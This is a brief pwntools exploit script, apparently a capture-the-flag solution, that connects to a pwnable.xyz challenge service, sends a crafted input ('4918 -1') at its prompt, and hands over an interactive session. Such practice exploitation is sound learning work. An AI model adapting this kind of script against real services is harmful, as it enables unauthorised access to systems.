from pwn import *

#p = process('./challenge')
p = remote('svc.pwnable.xyz', 30001)
p.sendlineafter(b'input: ',b'4918 -1')

p.interactive()
